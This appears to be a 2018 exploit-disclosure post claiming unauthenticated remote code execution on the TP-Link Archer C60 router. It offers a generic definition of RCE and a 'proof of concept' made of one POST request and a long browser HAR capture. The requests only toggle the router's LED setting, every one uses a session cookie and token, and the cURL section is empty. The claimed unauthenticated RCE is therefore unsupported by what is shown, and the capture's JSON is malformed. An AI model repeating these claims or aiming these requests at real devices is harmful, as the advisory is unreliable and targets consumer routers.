# Date: [16.07.2018] 
# Exploit Author: [Ismail Tasdelen]
# Vendor Homepage: [https://www.tp-link.com/]
# Hardware Link : [https://www.tp-link.com/la/products/details/cat-9_Archer-C60.html]
# Hardware Version : [Archer C60 v1.0]
# Firmware Version : [1.0.2 Build 20160811 rel.55127]
# Vulernability Type : [RCE - Remote Code Execution]
# Vulenrability : [UnAuthenticated Remote Code Execution]
# Risk : [High]

# Description : What is remote code execution vulnerability ?

Vulnerabilities can provide an attacker with the ability to execute malicious code and take complete control of an affected system with the privileges of the user running the application. Remote code execution can be best described as an action which involves an attacker executing code remotely using system vulnerabilities. Such code can run from a remote server, which means that the attack can originate from anywhere around the world giving the attacker access to the PC. Once a hacker gains access to a system, theyall be able to make changes within the target computer.The attacker leverages the useras admin privileges to allow them to execute code and make further changes to the computer. Itas often the case that such user privileges become elevated. Attackers usually look to gain further control on the system they already have a grip on and look to exert control onto other computers on the same network.

# POC:

# cURL Request :


# HTTP Request :

POST /cgi-bin/luci/;stok=c2d1f90cc991ef6a5b8c3afa28d7a58b/admin/ledgeneral?form=setting HTTP/1.1
Host: 192.168.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.1:8081/webpages/index.html
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 15
Cookie: sysauth=bcb79fd1c5603393ab98f11fc0bde7e6
Connection: keep-alive

# HTTP Response :

HTTP/1.1 200 OK
Connection: close
Content-Type: application/json
Cache-Control: no-cache
Expires: 0

JSON Data :

{
  "log": {
    "version": "1.1",
    "creator": {
      "name": "Firefox",
      "version": "52.9.0"
    },
    "browser": {
      "name": "Firefox",
      "version": "52.9.0"
    },
    "pages": [
      {
        "startedDateTime": "2018-07-16T17:21:02.824+03:00",
        "id": "page_1",
        "title": "Archer C60",
        "pageTimings": {
          "onContentLoad": -1,
          "onLoad": -1
        }
      }
    ],
    "entries": [
      {
        "pageref": "page_1",
        "startedDateTime": "2018-07-16T17:21:02.824+03:00",
        "time": 0,
        "request": {
          "bodySize": 0,
          "method": "GET",
          "url": "http://192.168.0.1:8081/webpages/themes/blue/css/widget.css",
          "httpVersion": "HTTP/1.1",
          "headers": [
            {
              "name": "Host",
              "value": "192.168.0.1:8081"
            },
            {
              "name": "User-Agent",
              "value": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
            },
            {
              "name": "Accept",
              "value": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            },
            {
              "name": "Accept-Language",
              "value": "en-US,en;q=0.5"
            },
            {
              "name": "Accept-Encoding",
              "value": "gzip, deflate"
            },
            {
              "name": "Connection",
              "value": "keep-alive"
            }
          ],
          "cookies": [],
          "queryString": [],
          "postData": {
            "mimeType": "",
            "params": [],
            "text": ""
          },
          "headersSize": 0
        },
        "response": {
          "status": 200,
          "statusText": "OK",
          "httpVersion": "HTTP/1.1",
          "headers": [
            {
              "name": "Etag",
              "value": "\"24d-edff-5685a57e\""
            },
            {
              "name": "Last-Modified",
              "value": "Thu, 31 Dec 2015 22:00:30 GMT"
            },
            {
              "name": "Content-Type",
              "value": "text/css"
            },
            {
              "name": "Content-Length",
              "value": "60927"
            },
            {
              "name": "Date",
              "value": "Thu, 31 Dec 2015 22:11:53 GMT"
            }
          ],
          "cookies": [],
          "content": {
            "mimeType": "text/css",
            "size": 60927,
          },
          "redirectURL": "",
          "headersSize": 0,
          "bodySize": 0
        },
        "cache": {
          "afterRequest": null
        },
        "timings": {
          "blocked": 0,
          "dns": 0,
          "connect": 0,
          "send": 0,
          "wait": 0,
          "receive": 0
        }
      },
      {
        "pageref": "page_1",
        "startedDateTime": "2018-07-16T17:21:03.144+03:00",
        "time": 0,
        "request": {
          "bodySize": 0,
          "method": "GET",
          "url": "http://192.168.0.1:8081/webpages/css/widget.css",
          "httpVersion": "HTTP/1.1",
          "headers": [
            {
              "name": "Host",
              "value": "192.168.0.1:8081"
            },
            {
              "name": "User-Agent",
              "value": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
            },
            {
              "name": "Accept",
              "value": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            },
            {
              "name": "Accept-Language",
              "value": "en-US,en;q=0.5"
            },
            {
              "name": "Accept-Encoding",
              "value": "gzip, deflate"
            },
            {
              "name": "Connection",
              "value": "keep-alive"
            }
          ],
          "cookies": [],
          "queryString": [],
          "postData": {
            "mimeType": "",
            "params": [],
            "text": ""
          },
          "headersSize": 0
        },
        "response": {
          "status": 200,
          "statusText": "OK",
          "httpVersion": "HTTP/1.1",
          "headers": [
            {
              "name": "Etag",
              "value": "\"26f-2aa2-5685a57e\""
            },
            {
              "name": "Last-Modified",
              "value": "Thu, 31 Dec 2015 22:00:30 GMT"
            },
            {
              "name": "Content-Type",
              "value": "text/css"
            },
            {
              "name": "Content-Length",
              "value": "10914"
            },
            {
              "name": "Date",
              "value": "Thu, 31 Dec 2015 22:11:53 GMT"
            }
          ],
          "cookies": [],
          "content": {
            "mimeType": "text/css",
            "size": 10914,
          },
          "redirectURL": "",
          "headersSize": 0,
          "bodySize": 0
        },
        "cache": {
          "afterRequest": null
        },
        "timings": {
          "blocked": 0,
          "dns": 0,
          "connect": 0,
          "send": 0,
          "wait": 0,
          "receive": 0
        }
      },
      {
        "pageref": "page_1",
        "startedDateTime": "2018-07-16T17:21:03.318+03:00",
        "time": 0,
        "request": {
          "bodySize": 0,
          "method": "GET",
          "url": "http://192.168.0.1:8081/webpages/themes/blue/css/style.css",
          "httpVersion": "HTTP/1.1",
          "headers": [
            {
              "name": "Host",
              "value": "192.168.0.1:8081"
            },
            {
              "name": "User-Agent",
              "value": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
            },
            {
              "name": "Accept",
              "value": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            },
            {
              "name": "Accept-Language",
              "value": "en-US,en;q=0.5"
            },
            {
              "name": "Accept-Encoding",
              "value": "gzip, deflate"
            },
            {
              "name": "Connection",
              "value": "keep-alive"
            }
          ],
          "cookies": [],
          "queryString": [],
          "postData": {
            "mimeType": "",
            "params": [],
            "text": ""
          },
          "headersSize": 0
        },
        "response": {
          "status": 200,
          "statusText": "OK",
          "httpVersion": "HTTP/1.1",
          "headers": [
            {
              "name": "Etag",
              "value": "\"24c-d2ff-5685a57e\""
            },
            {
              "name": "Last-Modified",
              "value": "Thu, 31 Dec 2015 22:00:30 GMT"
            },
            {
              "name": "Content-Type",
              "value": "text/css"
            },
            {
              "name": "Content-Length",
              "value": "54015"
            },
            {
              "name": "Date",
              "value": "Thu, 31 Dec 2015 22:11:53 GMT"
            }
          ],
          "cookies": [],
          "content": {
            "mimeType": "text/css",
            "size": 54015,
          },
          "redirectURL": "",
          "headersSize": 0,
          "bodySize": 0
        },
        "cache": {
          "afterRequest": null
        },
        "timings": {
          "blocked": 0,
          "dns": 0,
          "connect": 0,
          "send": 0,
          "wait": 0,
          "receive": 0
        }
      },
      {
        "pageref": "page_1",
        "startedDateTime": "2018-07-16T17:21:10.644+03:00",
        "time": 1396,
        "request": {
          "bodySize": 15,
          "method": "POST",
          "url": "http://192.168.0.1:8081/cgi-bin/luci/;stok=c2d1f90cc991ef6a5b8c3afa28d7a58b/admin/ledgeneral?form=setting",
          "httpVersion": "HTTP/1.1",
          "headers": [
            {
              "name": "Host",
              "value": "192.168.0.1:8081"
            },
            {
              "name": "User-Agent",
              "value": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
            },
            {
              "name": "Accept",
              "value": "application/json, text/javascript, */*; q=0.01"
            },
            {
              "name": "Accept-Language",
              "value": "en-US,en;q=0.5"
            },
            {
              "name": "Accept-Encoding",
              "value": "gzip, deflate"
            },
            {
              "name": "Referer",
              "value": "http://192.168.0.1:8081/webpages/index.html"
            },
            {
              "name": "Content-Type",
              "value": "application/x-www-form-urlencoded; charset=UTF-8"
            },
            {
              "name": "X-Requested-With",
              "value": "XMLHttpRequest"
            },
            {
              "name": "Content-Length",
              "value": "15"
            },
            {
              "name": "Cookie",
              "value": "sysauth=bcb79fd1c5603393ab98f11fc0bde7e6"
            },
            {
              "name": "Connection",
              "value": "keep-alive"
            }
          ],
          "cookies": [
            {
              "name": "sysauth",
              "value": "bcb79fd1c5603393ab98f11fc0bde7e6"
            }
          ],
          "queryString": [
            {
              "name": "form",
              "value": "setting"
            }
          ],
          "postData": {
            "mimeType": "application/x-www-form-urlencoded",
            "params": [
              {
                "name": "operation",
                "value": "write"
              }
            ],
            "text": "operation=write"
          },
          "headersSize": 577
        },
        "response": {
          "status": 200,
          "statusText": "OK",
          "httpVersion": "HTTP/1.1",
          "headers": [
            {
              "name": "Cache-Control",
              "value": "no-cache"
            },
            {
              "name": "Connection",
              "value": "close"
            },
            {
              "name": "Content-Type",
              "value": "application/json"
            },
            {
              "name": "Expires",
              "value": "0"
            }
          ],
          "cookies": [],
          "content": {
            "mimeType": "application/json",
            "size": 40,
            "text": "{\"success\":true,\"data\":{\"enable\":\"off\"}}"
          },
          "redirectURL": "",
          "headersSize": 107,
          "bodySize": 40
        },
        "cache": {},
        "timings": {
          "blocked": 344,
          "dns": 0,
          "connect": 0,
          "send": 0,
          "wait": 1044,
          "receive": 8
        },
        "serverIPAddress": "192.168.0.1",
        "connection": "8081"
      },
      {
        "pageref": "page_1",
        "startedDateTime": "2018-07-16T17:21:17.207+03:00",
        "time": 1470,
        "request": {
          "bodySize": 15,
          "method": "POST",
          "url": "http://192.168.0.1:8081/cgi-bin/luci/;stok=c2d1f90cc991ef6a5b8c3afa28d7a58b/admin/ledgeneral?form=setting",
          "httpVersion": "HTTP/1.1",
          "headers": [
            {
              "name": "Host",
              "value": "192.168.0.1:8081"
            },
            {
              "name": "User-Agent",
              "value": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
            },
            {
              "name": "Accept",
              "value": "application/json, text/javascript, */*; q=0.01"
            },
            {
              "name": "Accept-Language",
              "value": "en-US,en;q=0.5"
            },
            {
              "name": "Accept-Encoding",
              "value": "gzip, deflate"
            },
            {
              "name": "Referer",
              "value": "http://192.168.0.1:8081/webpages/index.html"
            },
            {
              "name": "Content-Type",
              "value": "application/x-www-form-urlencoded; charset=UTF-8"
            },
            {
              "name": "X-Requested-With",
              "value": "XMLHttpRequest"
            },
            {
              "name": "Content-Length",
              "value": "15"
            },
            {
              "name": "Cookie",
              "value": "sysauth=bcb79fd1c5603393ab98f11fc0bde7e6"
            },
            {
              "name": "Connection",
              "value": "keep-alive"
            }
          ],
          "cookies": [
            {
              "name": "sysauth",
              "value": "bcb79fd1c5603393ab98f11fc0bde7e6"
            }
          ],
          "queryString": [
            {
              "name": "form",
              "value": "setting"
            }
          ],
          "postData": {
            "mimeType": "application/x-www-form-urlencoded",
            "params": [
              {
                "name": "operation",
                "value": "write"
              }
            ],
            "text": "operation=write"
          },
          "headersSize": 577
        },
        "response": {
          "status": 200,
          "statusText": "OK",
          "httpVersion": "HTTP/1.1",
          "headers": [
            {
              "name": "Cache-Control",
              "value": "no-cache"
            },
            {
              "name": "Connection",
              "value": "close"
            },
            {
              "name": "Content-Type",
              "value": "application/json"
            },
            {
              "name": "Expires",
              "value": "0"
            }
          ],
          "cookies": [],
          "content": {
            "mimeType": "application/json",
            "size": 39,
            "text": "{\"success\":true,\"data\":{\"enable\":\"on\"}}"
          },
          "redirectURL": "",
          "headersSize": 107,
          "bodySize": 39
        },
        "cache": {},
        "timings": {
          "blocked": 341,
          "dns": 0,
          "connect": 0,
          "send": 0,
          "wait": 1113,
          "receive": 16
        },
        "serverIPAddress": "192.168.0.1",
        "connection": "8081"
      },
      {
        "pageref": "page_1",
        "startedDateTime": "2018-07-16T17:22:21.601+03:00",
        "time": 1367,
        "request": {
          "bodySize": 15,
          "method": "POST",
          "url": "http://192.168.0.1:8081/cgi-bin/luci/;stok=c2d1f90cc991ef6a5b8c3afa28d7a58b/admin/ledgeneral?form=setting",
          "httpVersion": "HTTP/1.1",
          "headers": [
            {
              "name": "Host",
              "value": "192.168.0.1:8081"
            },
            {
              "name": "User-Agent",
              "value": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
            },
            {
              "name": "Accept",
              "value": "application/json, text/javascript, */*; q=0.01"
            },
            {
              "name": "Accept-Language",
              "value": "en-US,en;q=0.5"
            },
            {
              "name": "Accept-Encoding",
              "value": "gzip, deflate"
            },
            {
              "name": "Referer",
              "value": "http://192.168.0.10:8081/webpages/index.html"
            },
            {
              "name": "Content-Type",
              "value": "application/x-www-form-urlencoded; charset=UTF-8"
            },
            {
              "name": "X-Requested-With",
              "value": "XMLHttpRequest"
            },
            {
              "name": "Content-Length",
              "value": "15"
            },
            {
              "name": "Cookie",
              "value": "sysauth=bcb79fd1c5603393ab98f11fc0bde7e6"
            },
            {
              "name": "Connection",
              "value": "keep-alive"
            },
            {
              "name": "Pragma",
              "value": "no-cache"
            },
            {
              "name": "Cache-Control",
              "value": "no-cache"
            }
          ],
          "cookies": [
            {
              "name": "sysauth",
              "value": "bcb79fd1c5603393ab98f11fc0bde7e6"
            }
          ],
          "queryString": [
            {
              "name": "form",
              "value": "setting"
            }
          ],
          "postData": {
            "mimeType": "application/x-www-form-urlencoded",
            "params": [
              {
                "name": "operation",
                "value": "write"
              }
            ],
            "text": "operation=write"
          },
          "headersSize": 620
        },
        "response": {
          "status": 200,
          "statusText": "OK",
          "httpVersion": "HTTP/1.1",
          "headers": [
            {
              "name": "Cache-Control",
              "value": "no-cache"
            },
            {
              "name": "Connection",
              "value": "close"
            },
            {
              "name": "Content-Type",
              "value": "application/json"
            },
            {
              "name": "Expires",
              "value": "0"
            }
          ],
          "cookies": [],
          "content": {
            "mimeType": "application/json",
            "size": 40,
            "text": "{\"success\":true,\"data\":{\"enable\":\"off\"}}"
          },
          "redirectURL": "",
          "headersSize": 107,
          "bodySize": 40
        },
        "cache": {},
        "timings": {
          "blocked": 330,
          "dns": 0,
          "connect": 0,
          "send": 0,
          "wait": 1019,
          "receive": 18
        },
        "serverIPAddress": "192.168.0.1",
        "connection": "8081"
      },
      {
        "pageref": "page_1",
        "startedDateTime": "2018-07-16T17:22:30.212+03:00",
        "time": 1354,
        "request": {
          "bodySize": 15,
          "method": "POST",
          "url": "http://192.168.0.1:8081/cgi-bin/luci/;stok=c2d1f90cc991ef6a5b8c3afa28d7a58b/admin/ledgeneral?form=setting",
          "httpVersion": "HTTP/1.1",
          "headers": [
            {
              "name": "Host",
              "value": "192.168.0.1:8081"
            },
            {
              "name": "User-Agent",
              "value": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
            },
            {
              "name": "Accept",
              "value": "application/json, text/javascript, */*; q=0.01"
            },
            {
              "name": "Accept-Language",
              "value": "en-US,en;q=0.5"
            },
            {
              "name": "Accept-Encoding",
              "value": "gzip, deflate"
            },
            {
              "name": "Referer",
              "value": "http://192.168.0.1:8081/webpages/index.html"
            },
            {
              "name": "Content-Type",
              "value": "application/x-www-form-urlencoded; charset=UTF-8"
            },
            {
              "name": "X-Requested-With",
              "value": "XMLHttpRequest"
            },
            {
              "name": "Content-Length",
              "value": "15"
            },
            {
              "name": "Cookie",
              "value": "sysauth=bcb79fd1c5603393ab98f11fc0bde7e6"
            },
            {
              "name": "Connection",
              "value": "keep-alive"
            },
            {
              "name": "Pragma",
              "value": "no-cache"
            },
            {
              "name": "Cache-Control",
              "value": "no-cache"
            }
          ],
          "cookies": [
            {
              "name": "sysauth",
              "value": "bcb79fd1c5603393ab98f11fc0bde7e6"
            }
          ],
          "queryString": [
            {
              "name": "form",
              "value": "setting"
            }
          ],
          "postData": {
            "mimeType": "application/x-www-form-urlencoded",
            "params": [
              {
                "name": "operation",
                "value": "write"
              }
            ],
            "text": "operation=write"
          },
          "headersSize": 620
        },
        "response": {
          "status": 200,
          "statusText": "OK",
          "httpVersion": "HTTP/1.1",
          "headers": [
            {
              "name": "Cache-Control",
              "value": "no-cache"
            },
            {
              "name": "Connection",
              "value": "close"
            },
            {
              "name": "Content-Type",
              "value": "application/json"
            },
            {
              "name": "Expires",
              "value": "0"
            }
          ],
          "cookies": [],
          "content": {
            "mimeType": "application/json",
            "size": 39,
            "text": "{\"success\":true,\"data\":{\"enable\":\"on\"}}"
          },
          "redirectURL": "",
          "headersSize": 107,
          "bodySize": 39
        },
        "cache": {},
        "timings": {
          "blocked": 331,
          "dns": 0,
          "connect": 0,
          "send": 0,
          "wait": 1007,
          "receive": 16
        },
        "serverIPAddress": "192.168.0.1",
        "connection": "8081"
      }
    ]
  }
}

# You want to follow my activity ?

https://www.linkedin.com/in/ismailtasdelen
https://github.com/ismailtasdelen
https://packetstormsecurity.com/user/ismailtasdelen

